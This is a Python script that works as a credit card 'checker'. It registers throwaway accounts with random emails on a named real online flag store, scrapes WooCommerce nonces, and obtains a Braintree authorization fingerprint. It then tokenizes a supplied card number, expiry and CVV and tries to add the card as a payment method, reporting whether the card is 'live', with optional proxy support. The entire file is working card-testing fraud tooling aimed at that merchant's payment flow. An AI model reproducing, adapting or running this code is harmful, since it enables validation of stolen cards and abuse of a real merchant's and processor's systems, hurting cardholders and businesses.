import requests
import random
import string
import re
import base64
import json
from bs4 import BeautifulSoup

def generate_random_email(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"

def check_card(cc, month, year, cvv, proxy=None):
    """
    Returns (is_live: bool, message: str)
    """
    s = requests.Session()
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

    try:
        # ── Step 1: Get registration nonce ──
        resp = s.post('https://www.flagworld.com.au/my-account/', headers={'User-Agent': ua}, timeout=15)
        if resp.status_code != 200:
            return False, f"Step 1 failed (HTTP {resp.status_code})"
        reg_nonce = re.search(r'name="woocommerce-register-nonce".*?value="([^"]+)"', resp.text)
        if not reg_nonce:
            return False, "Registration nonce not found"
        reg_nonce = reg_nonce.group(1)

        # ── Step 2: Register fake user ──
        email = generate_random_email()
        reg_data = {
            'email': email,
            'billing_phone': '15068596852',
            'billing_company': 'waysss',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://www.flagworld.com.au/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': '2026-04-22 19:14:02',
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': ua,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'register': 'Register',
        }
        resp = s.post('https://www.flagworld.com.au/my-account/add-payment-method/',
                      headers={'User-Agent': ua}, data=reg_data, timeout=15)
        if resp.status_code != 200:
            return False, f"Registration failed (HTTP {resp.status_code})"

        # ── Step 3: Fetch page to get client token nonce & add-payment-method nonce ──
        resp = s.get('https://www.flagworld.com.au/my-account/add-payment-method/',
                     headers={'User-Agent': ua}, timeout=15)
        if resp.status_code != 200:
            return False, f"Get page failed (HTTP {resp.status_code})"
        client_nonce = re.search(r'"client_token_nonce":"([^"]+)"', resp.text)
        add_nonce = re.search(r'id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"', resp.text)
        if not client_nonce or not add_nonce:
            return False, "Client nonce or add payment method nonce not found"
        client_nonce = client_nonce.group(1)
        add_nonce = add_nonce.group(1)

        # ── Step 4: Get Braintree authorization fingerprint ──
        resp = s.post('https://www.flagworld.com.au/wp-admin/admin-ajax.php',
                      data={
                          'action': 'wc_braintree_credit_card_get_client_token',
                          'nonce': client_nonce
                      },
                      headers={
                          'User-Agent': ua,
                          'X-Requested-With': 'XMLHttpRequest'
                      }, timeout=15)
        if resp.status_code != 200:
            return False, f"Get Braintree token failed (HTTP {resp.status_code})"
        try:
            enc = resp.json()['data']
        except Exception:
            return False, "Invalid response for Braintree token"
        decoded = json.loads(base64.b64decode(enc).decode())
        auth_fingerprint = decoded.get('authorizationFingerprint')
        if not auth_fingerprint:
            return False, "Braintree auth fingerprint missing"

        # ── Step 5: Tokenize credit card ──
        bt_headers = {
            'Authorization': f'Bearer {auth_fingerprint}',
            'Content-Type': 'application/json',
            'Braintree-version': '2018-05-10',
            'User-Agent': ua,
        }
        tokenize_payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '75e33920-44f7-4d60-955b-53092d4f34fe',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': month,
                        'expirationYear': year,
                        'cvv': cvv,
                    },
                    'options': {'validate': False},
                },
            },
        }
        resp = s.post('https://payments.braintree-api.com/graphql',
                      headers=bt_headers, json=tokenize_payload, timeout=15)
        if resp.status_code != 200:
            return False, f"Tokenization failed (HTTP {resp.status_code})"
        try:
            token = resp.json()['data']['tokenizeCreditCard']['token']
        except Exception:
            return False, "Could not extract token"

        # ── Step 6: Add payment method ──
        add_data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        resp = s.post('https://www.flagworld.com.au/my-account/add-payment-method/',
                      headers={'User-Agent': ua}, data=add_data, timeout=15)

        # ── Step 7: Parse result ──
        soup = BeautifulSoup(resp.text, 'html.parser')
        msg = None
        div = soup.find('div', class_='message-container')
        if div:
            msg = div.get_text(strip=True)
        if not msg:
            span = soup.find('span', class_='message-icon')
            if span and span.next_sibling:
                msg = span.next_sibling.strip()
        if not msg:
            ul = soup.find('ul', class_='woocommerce-error')
            if ul:
                msg = ul.get_text(strip=True)
        if not msg:
            success_div = soup.find('div', class_='woocommerce-message')
            if success_div:
                msg = success_div.get_text(strip=True)

        if msg and ('added' in msg.lower() or 'success' in msg.lower() or 'payment method' in msg.lower()):
            return True, msg
        else:
            return False, msg or 'Unknown error'

    except requests.exceptions.ProxyError:
        return False, "Proxy error"
    except requests.exceptions.ConnectTimeout:
        return False, "Connection timeout"
    except Exception as e:
        return False, f"Unexpected error: {str(e)[:150]}"
